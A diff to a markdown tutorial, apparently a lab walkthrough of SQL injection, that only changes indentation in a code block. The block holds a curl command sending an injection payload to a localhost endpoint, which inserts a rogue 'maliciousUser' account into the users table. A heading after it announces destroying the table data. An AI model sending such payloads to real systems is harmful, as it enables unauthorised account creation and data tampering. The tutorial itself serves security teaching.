@@ -93,10 +93,10 @@ To break down each step of the statement:
 Because the entrypoint for the data is in the body of the request, the SQL statement will need to be sent as a string in the body of the request. Below is the curl request that will insert a malicious user into the users table:
 
 ```sh
-	curl \
-		--request POST \
-		--data-binary "', 1); INSERT INTO users (username, password) VALUES ('maliciousUser', 'p@$$w0rd'); --" \
-		http://localhost:3000/message/1
+curl \
+	--request POST \
+	--data-binary "', 1); INSERT INTO users (username, password) VALUES ('maliciousUser', 'p@$$w0rd'); --" \
+	http://localhost:3000/message/1
 ```
 
 ## Destroying the table data in the database
